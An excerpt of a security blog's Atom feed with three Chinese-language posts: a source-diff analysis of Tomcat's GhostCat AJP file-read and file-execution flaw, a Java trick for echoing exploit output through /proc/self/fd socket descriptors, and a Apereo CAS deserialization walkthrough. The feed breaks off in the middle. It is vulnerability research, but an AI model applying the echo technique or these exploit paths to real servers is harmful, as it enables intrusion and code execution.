<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>00theway&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/58f332b6b2ffcb3971ac54b001f62f29</icon>
  <subtitle>OnTheWay</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.00theway.org/"/>
  <updated>2020-02-23T04:11:09.352Z</updated>
  <id>https://www.00theway.org/</id>
  
  <author>
    <name>00theway</name>
    <email>admin@00theway.org</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GhostCat-从源代码比对到漏洞利用</title>
    <link href="https://www.00theway.org/2020/02/22/ajp-shooter-from-source-code-to-exploit/"/>
    <id>https://www.00theway.org/2020/02/22/ajp-shooter-from-source-code-to-exploit/</id>
    <published>2020-02-22T13:51:34.000Z</published>
    <updated>2020-02-23T04:11:09.352Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="symbol">_</span>    <span class="symbol">_</span>         <span class="symbol">__</span> <span class="symbol">_</span>                 <span class="symbol">_</span>            </span><br><span class="line">  /<span class="symbol">_</span>\  (<span class="symbol">_</span>)<span class="symbol">_</span> <span class="symbol">__</span>   / <span class="symbol">_</span>\ |<span class="symbol">__</span>   ___   ___ | |<span class="symbol">_</span> ___ <span class="symbol">_</span> <span class="symbol">__</span> </span><br><span class="line"> //<span class="symbol">_</span>\\ | | '<span class="symbol">_</span> \  \ \| '<span class="symbol">_</span> \ / <span class="symbol">_</span> \ / <span class="symbol">_</span> \| <span class="symbol">__</span>/ <span class="symbol">_</span> \ '<span class="symbol">__</span>|</span><br><span class="line">/  <span class="symbol">_</span>  \| | |<span class="symbol">_</span>) | <span class="symbol">_</span>\ \ | | | (<span class="symbol">_</span>) | (<span class="symbol">_</span>) | ||  <span class="symbol">__</span>/ |   </span><br><span class="line">\<span class="symbol">_</span>/ \<span class="symbol">_</span>// | .<span class="symbol">__</span>/  \<span class="symbol">__</span>/<span class="symbol">_</span>| |<span class="symbol">_</span>|\___/ \___/ \<span class="symbol">__</span>\___|<span class="symbol">_</span>|   </span><br><span class="line">     |<span class="symbol">__</span>/|<span class="symbol">_</span>|</span><br></pre></td></tr></table></figure><h1 id="背景介绍">背景介绍</h1><p>2月20日，国家信息安全漏洞共享平台（CNVD）发布了一则关于Apache Tomcat存在文件包含漏洞的安全公告（<a href="https://www.cnvd.org.cn/webinfo/show/5415" target="_blank" rel="noopener">CNVD-2020-10487</a>，对应CVE-2020-1938）。漏洞影响范围覆盖了tomcat 6、7、8、9的全版本（Apache官方已发布9.0.31、8.5.51及7.0.100版本对此漏洞进行修复），外网虽然不常见，用来内网拓展是一个很不错的漏洞。</p><p>目前各种exp已经满天飞了，这里记录一下通过对比源代码定位漏洞的过程，有错误的地方还请大牛指正。</p><h1 id="环境准备">环境准备</h1><p>这里以tomcat <a href="https://github.com/apache/tomcat/tree/7.0.99" target="_blank" rel="noopener">7.0.99</a>版本代码为例作为分析环境。</p><h1 id="漏洞分析过程">漏洞分析过程</h1><h2 id="diff源代码">diff源代码</h2><p>这里使用github的源代码对比功能进行分析。<br><img src="github-diff.png" alt><br>通过代码对比功能我们可以看到tomcat从7.0.99版本升级到7.0.100版本一共更改了152个文件。</p><p>通过ajp关键字可以发现ajp相关的源代码修改集中在“org.apache.coyote.ajp”包里</p><p><img src="github-ajp-diff.png" alt></p><p>通过近一步阅读这个包下边改动的源代码可以发现主要改动集中在两方面</p><ol><li>添加了认证相关的代码</li></ol><blockquote><p>文件 java/org/apache/coyote/ajp/AbstractAjpProcessor.java</p></blockquote><p><img src="github-diff-secure.png" alt></p><ol start="2"><li>对Attribute的设置进行了限制</li></ol><blockquote><p>文件 java/org/apache/coyote/ajp/AbstractAjpProcessor.java</p></blockquote><p><img src="github-diff-attribute.png" alt></p><p>这里就可以了大概猜测认证相关代码是为了防止类似事件发生，限制attribute是针对性解决本地漏洞。下一步进行动态debug分析具体的是如何读文件和文件包含的。</p><h2 id="动态debug">动态debug</h2><p>这个时候断点的选择尤为重要，由于是第一次调试tomcat源代码，这里选择了两个断点</p><ol><li>index.jsp文件内</li><li>org.apache.coyote.Request.getAttributes、org.apache.coyote.Request.getAttribute，</li></ol><blockquote><p>第一个断点是为了捋清楚tomcat处理正常jsp文件的整个流程。</p></blockquote><blockquote><p>第二个断点来源与上一步的代码比对结果。上一步代码比对将问题定位在了request.setAttribute前后(request变量为org.apache.coyote.Request对象)，所以这个断点设在了Request对象attribute的获取上，以此判断恶意设置的属性是在什么状态下使用了哪些具体的值如何具体的影响了执行流程。</p></blockquote><p>通过调试发现静态资源会交由“org.apache.catalina.servlets.DefaultServlet”类处理，动态脚本会交由“org.apache.jasper.servlet.JspServlet”类处理。</p><ul><li><strong>文件读取</strong></li></ul><p>在类“org.apache.catalina.servlets.DefaultServlet”中tomcat在“getRelativePath()”这个函数对设置的属性进行取值，以下是具体逻辑。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="built_in">String</span> getRelativePath(HttpServletRequest <span class="built_in">request</span>, boolean allowEmptyPath) &#123;</span><br><span class="line">        <span class="built_in">String</span> servletPath;</span><br><span class="line">        <span class="built_in">String</span> pathInfo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">request</span>.getAttribute(RequestDispatcher.INCLUDE_REQUEST_URI) != <span class="literal">null</span>) &#123;</span><br><span class="line">            pathInfo = (<span class="built_in">String</span>) <span class="built_in">request</span>.getAttribute(RequestDispatcher.INCLUDE_PATH_INFO);</span><br><span class="line">            servletPath = (<span class="built_in">String</span>) <span class="built_in">request</span>.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pathInfo = <span class="built_in">request</span>.getPathInfo();</span><br><span class="line">            servletPath = <span class="built_in">request</span>.getServletPath();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">if</span> (servletPath.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.append(servletPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pathInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            result.append(pathInfo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result.length() == <span class="number">0</span> &amp;&amp; !allowEmptyPath) &#123;</span><br><span class="line">            result.append(<span class="comment">'/');</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">/*</span><br><span class="line">INCLUDE_REQUEST_URI = <span class="string">"javax.servlet.include.request_uri"</span></span><br><span class="line">INCLUDE_PATH_INFO = <span class="string">"javax.servlet.include.path_info"</span></span><br><span class="line">INCLUDE_SERVLET_PATH = <span class="string">"javax.servlet.include.servlet_path"</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>根据代码可以看出我们可以控制以上属性来控制“getRelativePath()”的返回值，下一步tomcat会使用返回值读取资源返回给用户，此时我们可以构造恶意的属性控制返回值为我们想读取的内容的路径达到读文件的目的。</p><ul><li><strong>文件执行</strong></li></ul><p>在类“org.apache.jasper.servlet.JspServlet”类中tomcat在“service()”这个函数对设置的属性进行取值，以下是具体逻辑。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">   @SuppressWarnings(<span class="string">"deprecation"</span>) <span class="comment">// Use of JSP_FILE to be removed in 9.0.x</span></span><br><span class="line">   @Override</span><br><span class="line">   <span class="keyword">public</span> <span class="literal">void</span> service (HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">       <span class="built_in">String</span> jspUri = jspFile;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (jspUri == <span class="built_in">null</span>) &#123;</span><br><span class="line">           <span class="built_in">String</span> jspFile = (<span class="built_in">String</span>) request.getAttribute(Constants.JSP_FILE);</span><br><span class="line">           <span class="keyword">if</span> (jspFile != <span class="built_in">null</span>) &#123;</span><br><span class="line">               jspUri = jspFile;</span><br><span class="line">               request.removeAttribute(Constants.JSP_FILE);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (jspUri == <span class="built_in">null</span>) &#123;</span><br><span class="line">           jspUri = (<span class="built_in">String</span>) request.getAttribute(</span><br><span class="line">                   RequestDispatcher.INCLUDE_SERVLET_PATH);</span><br><span class="line">           <span class="keyword">if</span> (jspUri != <span class="built_in">null</span>) &#123;</span><br><span class="line">               <span class="built_in">String</span> pathInfo = (<span class="built_in">String</span>) request.getAttribute(</span><br><span class="line">                       RequestDispatcher.INCLUDE_PATH_INFO);</span><br><span class="line">               <span class="keyword">if</span> (pathInfo != <span class="built_in">null</span>) &#123;</span><br><span class="line">                   jspUri += pathInfo;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               jspUri = request.getServletPath();</span><br><span class="line">               <span class="built_in">String</span> pathInfo = request.getPathInfo();</span><br><span class="line">               <span class="keyword">if</span> (pathInfo != <span class="built_in">null</span>) &#123;</span><br><span class="line">                   jspUri += pathInfo;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"><span class="params">...</span><span class="params">...</span></span><br><span class="line"></span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="built_in">boolean</span> precompile = preCompile(request);</span><br><span class="line">           serviceJspFile(request, response, jspUri, precompile);</span><br><span class="line"><span class="params">...</span><span class="params">...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">JSP_FILE = "org.apache.catalina.jsp_file"</span></span><br><span class="line"><span class="comment">INCLUDE_SERVLET_PATH = "javax.servlet.include.servlet_path"</span></span><br><span class="line"><span class="comment">INCLUDE_PATH_INFO = "javax.servlet.include.path_info"</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>根据代码可以看出我们可以通过构造恶意属性控制变量jspUri的值，下一步tomcat就对变量jspUri对应的文件进行了编译执行然后返回执行结果，至此可以达到文件执行的目的。</p><p>整个逻辑是tomcat根据url中的文件名判断了对应处理的servlet，之后又通过request的相关属性二次获取要处理的文件路径，前后不匹配导致可以构造恶意属性改变tomcat处理的目标文件达到文件读取、文件执行的目的。</p><h1 id="enter-hacking">Enter-Hacking</h1><p>文件读取<br><img src="ajp-read.png" alt></p><p>文件执行<br><img src="ajp-execute.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight maxima&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
    
      <category term="ajp" scheme="https://www.00theway.org/tags/ajp/"/>
    
      <category term="漏洞分析" scheme="https://www.00theway.org/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="CNVD-2020-10487" scheme="https://www.00theway.org/tags/CNVD-2020-10487/"/>
    
      <category term="CVE-2020-1938" scheme="https://www.00theway.org/tags/CVE-2020-1938/"/>
    
  </entry>
  
  <entry>
    <title>通杀漏洞利用回显方法-linux平台</title>
    <link href="https://www.00theway.org/2020/01/17/java-god-s-eye/"/>
    <id>https://www.00theway.org/2020/01/17/java-god-s-eye/</id>
    <published>2020-01-17T13:53:44.000Z</published>
    <updated>2020-01-18T11:06:11.071Z</updated>
    
    <content type="html"><![CDATA[<p><img src="eye.png" alt></p><h1 id="现状">现状</h1><p>在漏洞利用中经常出现获取不到执行结果的情况，各路大牛也是研究了各种方法，目前能看到的大概有以下几种方式获取结果：</p><ol><li>报错回显</li><li>web中获取当前上下文对象（response、context、writer等）</li><li>可以出网情况下OOB</li></ol><p>在国内环境下大多数情况下都限制了对外的网络访问，获取执行结果变得难上加难，所以对新的方法进行研究，于是产生了本方法。</p><h1 id="新的回显思路">新的回显思路</h1><p>经过一段时间的研究发现了一种新的通杀的回显思路。在LINUX环境下，可以通过文件描述符&quot;/proc/self/fd/i&quot;获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。</p><p>核心思路的实现代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;FileDescriptor&gt; c= <span class="module-access"><span class="module"><span class="identifier">FileDescriptor</span>.</span></span><span class="keyword">class</span>.get<span class="constructor">DeclaredConstructor(<span class="params">new</span> Class[]&#123;Integer.TYPE&#125;)</span>;</span><br><span class="line">c.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line">String ret = <span class="string">"00theway"</span>;</span><br><span class="line">FileOutputStream os = <span class="keyword">new</span> <span class="constructor">FileOutputStream(<span class="params">c</span>.<span class="params">newInstance</span>(<span class="params">new</span> Integer(4)</span>));</span><br><span class="line">os.write(ret.get<span class="constructor">Bytes()</span>);</span><br><span class="line">os.close<span class="literal">()</span>;</span><br></pre></td></tr></table></figure><p>在利用过程中会存在一个如何确定文件描述符id的情况，大家可以各显神通。</p><h1 id="思考">思考</h1><p>jvm所有的对象都存储在堆内存中，也许可以通过某种方法直接获取存储在堆内存中的socket对象实现回显，期待与各位师傅的沟通交流。</p><blockquote><p>在研究过程中学到一个新的知识点“/proc/thread-self/”，有兴趣的可以了解一下。</p></blockquote><h1 id="enter-hacking">Enter-hacking</h1><blockquote><p>自己动手，丰衣足食。</p><p>上一篇文章留下的彩蛋</p><p>利用此方法实现的一个shiro回显demo</p></blockquote><p><img src="shiro-show.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;eye.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;现状&quot;&gt;现状&lt;/h1&gt;
&lt;p&gt;在漏洞利用中经常出现获取不到执行结果的情况，各路大牛也是研究了各种方法，目前能看到的大概有以下几种方式获取结果：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;报错回显&lt;/li&gt;
&lt;li&gt;we
      
    
    </summary>
    
    
    
      <category term="通杀" scheme="https://www.00theway.org/tags/%E9%80%9A%E6%9D%80/"/>
    
      <category term="漏洞回显" scheme="https://www.00theway.org/tags/%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE/"/>
    
  </entry>
  
  <entry>
    <title>Apereo CAS 反序列化漏洞分析及回显利用</title>
    <link href="https://www.00theway.org/2020/01/04/apereo-cas-rce/"/>
    <id>https://www.00theway.org/2020/01/04/apereo-cas-rce/</id>
    <published>2020-01-04T11:11:41.000Z</published>
    <updated>2020-01-12T05:23:32.059Z</updated>
    
    <content type="html"><![CDATA[<p><img src="banner.png" alt></p><h1 id="背景介绍">背景介绍</h1><p>Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是基于此系统二次开发，官网对于漏洞的一个<a href="https://apereo.github.io/2016/04/08/commonsvulndisc/" target="_blank" rel="noopener">通告</a>，记录一下分析过程。</p><h1 id="漏洞环境">漏洞环境</h1><p>直接使用docker运行了4.1.6的cas环境,将源代码拷贝出来以供分析。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                              NAMES</span><br><span class="line"><span class="number">91</span>ae98e6388d        apereo/cas:v4<span class="number">.1</span><span class="number">.6</span>   <span class="string">"/cas-overlay/bin/ru…"</span>   <span class="number">9</span> days ago          Up <span class="number">20</span> seconds       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">32773</span>-&gt;<span class="number">8080</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">32772</span>-&gt;<span class="number">8443</span>/tcp</span><br><span class="line"># docker cp <span class="number">91</span>ae98e6388d:/cas-overlay ~/worksation/cas_4_1_6</span><br></pre></td></tr></table></figure><h1 id="漏洞分析">漏洞分析</h1><h3 id="1-cas如何处理请求">1. CAS如何处理请求</h3><p>Apereo CAS 使用了spring webflow来处理登录、退出等请求，处理流程可以看一下这篇文章<a href="https://blog.csdn.net/joeljx/article/details/88812944" target="_blank" rel="noopener">CAS单点登录开源框架解读（三）–CAS单点登录服务端认证之loginFlowRegistry流程</a>。</p><h3 id="2-漏洞触发流程">2. 漏洞触发流程</h3><p>cas中关于登录的配置文件如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /WEB-INF/cas-servlet.xml</span></span><br><span class="line">  &lt;bean <span class="attribute">id</span>=<span class="string">"loginHandlerAdapter"</span></span><br><span class="line">        <span class="attribute">class</span>=<span class="string">"org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"</span></span><br><span class="line">        p:<span class="attribute">supportedFlowId</span>=<span class="string">"login"</span></span><br><span class="line">        p:<span class="attribute">flowExecutor-ref</span>=<span class="string">"loginFlowExecutor"</span></span><br><span class="line">        p:<span class="attribute">flowUrlHandler-ref</span>=<span class="string">"loginFlowUrlHandler"</span> /&gt;</span><br></pre></td></tr></table></figure><p>当新的登录请求到达时，Spring会调用 “org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter”类 的handle函数来处理请求，这个类的handle函数实现在他的父类里边，关键代码如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.mvc.servlet.FlowHandlerAdapter.class</span></span><br><span class="line"></span><br><span class="line">public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">        this.check<span class="constructor">AndPrepare(<span class="params">request</span>, <span class="params">response</span>, <span class="params">false</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// flowExecutionKey是POST的“execution”的参数值，其中的flowUrlHandler在登录相关的配置文件中有配置“p:flowUrlHandler-ref="loginFlowUrlHandler"”</span></span><br><span class="line">        String flowExecutionKey = this.flowUrlHandler.get<span class="constructor">FlowExecutionKey(<span class="params">request</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span> (flowExecutionKey != null) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ServletExternalContext context = this.create<span class="constructor">ServletExternalContext(<span class="params">request</span>, <span class="params">response</span>)</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//用来恢复execute中存储的当前状态，漏洞从这里开始，其中flowExecutor在登录相关的配置文件中可以找到</span></span><br><span class="line">                             <span class="comment">//p:flowExecutor-ref="loginFlowExecutor"，loginFlowExecutor对应的类为“org.springframework.webflow.executor.FlowExecutorImpl”</span></span><br><span class="line">                FlowExecutionResult result = this.flowExecutor.resume<span class="constructor">Execution(<span class="params">flowExecutionKey</span>, <span class="params">context</span>)</span>;</span><br><span class="line">                this.handle<span class="constructor">FlowExecutionResult(<span class="params">result</span>, <span class="params">context</span>, <span class="params">request</span>, <span class="params">response</span>, <span class="params">flowHandler</span>)</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>跟进看一下 &quot;this.flowExecutor.resumeExecution(flowExecutionKey, context);&quot;是如何恢复状态的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.executor.FlowExecutorImpl.class</span></span><br><span class="line"></span><br><span class="line">public FlowExecutionResult resume<span class="constructor">Execution(String <span class="params">flowExecutionKey</span>, ExternalContext <span class="params">context</span>)</span> throws FlowException &#123;</span><br><span class="line">        FlowExecutionResult var6;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.is<span class="constructor">DebugEnabled()</span>) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Resuming flow execution with key '"</span> + flowExecutionKey);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">ExternalContextHolder</span>.</span></span>set<span class="constructor">ExternalContext(<span class="params">context</span>)</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 简单解析flowExecutionKey的数据到FlowExecutionKey对象，供后续使用</span></span><br><span class="line">            FlowExecutionKey key = this.executionRepository.parse<span class="constructor">FlowExecutionKey(<span class="params">flowExecutionKey</span>)</span>;</span><br><span class="line">            FlowExecutionLock lock = this.executionRepository.get<span class="constructor">Lock(<span class="params">key</span>)</span>;</span><br><span class="line">            lock.lock<span class="literal">()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过FlowExecutionKey恢复状态，其中处理不当导致了反序列化漏洞</span></span><br><span class="line">                FlowExecution flowExecution = this.executionRepository.get<span class="constructor">FlowExecution(<span class="params">key</span>)</span>;</span><br><span class="line">                flowExecution.resume(context);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>继续跟进“this.executionRepository.getFlowExecution(key);”的处理流程</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> FlowExecution getFlowExecution(FlowExecutionKey <span class="built_in">key</span>) <span class="keyword">throws</span> FlowExecutionRepositoryException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="built_in">key</span> <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Expected instance of ClientFlowExecutionKey but got "</span> + <span class="built_in">key</span>.getClass().getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从上一步解析出的key对象中获取序列化相关的数据</span></span><br><span class="line">            <span class="built_in">byte</span>[] encoded = ((ClientFlowExecutionKey)<span class="built_in">key</span>).getData();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在this.transcoder.decode(encoded)代码解密中同时进行了反序列化恢复状态</span></span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="keyword">this</span>.transcoder.decode(encoded);</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>简单看一下解密相关的代码，漏洞触发点</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.jasig.spring.webflow.plugin.EncryptedTranscoder.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object decode(byte[] encoded) throws IOException &#123;</span><br><span class="line">        byte[] data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = <span class="built_in">this</span>.cipherBean.decrypt(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IOException</span>(<span class="string">"Decryption error"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream inBuffer = <span class="keyword">new</span> <span class="type">ByteArrayInputStream</span>(data);</span><br><span class="line">        ObjectInputStream <span class="keyword">in</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Object var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.compression) &#123;</span><br><span class="line">                <span class="keyword">in</span> = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(<span class="keyword">new</span> <span class="type">GZIPInputStream</span>(inBuffer));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">in</span> = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(inBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 触发反序列化漏洞</span></span><br><span class="line">            var5 = <span class="keyword">in</span>.readObject();</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到作者有意识的对序列化数据进行了加密，并使用配置的cipherBean进行解密</p><p>看一下cipherBean的相关配置</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowStateTranscoder"</span> <span class="attr">class</span>=<span class="string">"org.jasig.spring.webflow.plugin.EncryptedTranscoder"</span></span></span></span><br><span class="line"><span class="xml">          c:cipherBean-ref="loginFlowCipherBean" /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherBean"</span> <span 